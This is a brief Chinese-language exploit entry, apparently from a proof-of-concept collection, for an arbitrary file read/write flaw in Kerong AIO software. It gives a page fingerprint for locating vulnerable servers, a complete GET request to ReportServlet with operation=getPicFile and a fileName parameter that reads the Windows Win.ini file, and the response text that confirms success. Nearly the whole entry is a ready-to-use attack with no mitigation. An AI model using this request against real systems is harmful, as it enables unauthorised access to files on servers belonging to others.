# 科荣AIO任意文件读取漏洞

科荣AIO ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"changeAccount('8000')"`
- **请求**：`GET ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini HTTP/1.1`
- **响应特征**：200 support